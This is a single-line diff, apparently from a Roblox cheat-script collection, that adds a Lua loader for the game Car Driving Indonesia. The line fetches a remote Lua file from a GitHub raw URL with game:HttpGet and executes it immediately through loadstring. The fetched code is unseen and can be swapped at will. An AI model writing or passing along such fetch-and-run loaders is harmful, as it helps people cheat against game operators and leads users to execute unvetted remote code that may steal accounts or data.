@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/car-driving-indonesia-spam7-l0he8tuqjqakm6.lua"))()
